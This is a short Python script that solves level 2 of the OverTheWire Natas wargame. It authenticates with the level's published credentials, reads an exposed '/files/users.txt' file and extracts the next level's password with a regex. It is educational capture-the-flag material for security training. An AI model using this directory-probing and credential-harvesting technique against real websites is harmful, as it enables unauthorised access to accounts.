# Vulnerability: Hidden directory exposed in the source code

import requests
import re
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/files/users.txt'


# Make a GET request to the URL with basic authentication using the provided credentials
resp = requests.get(url=url, auth=(username, password))


# Extract the password for the next level using Regular Expressions
print(f"Natas3: {re.findall('natas3:(.*)', resp.text)[0]}")
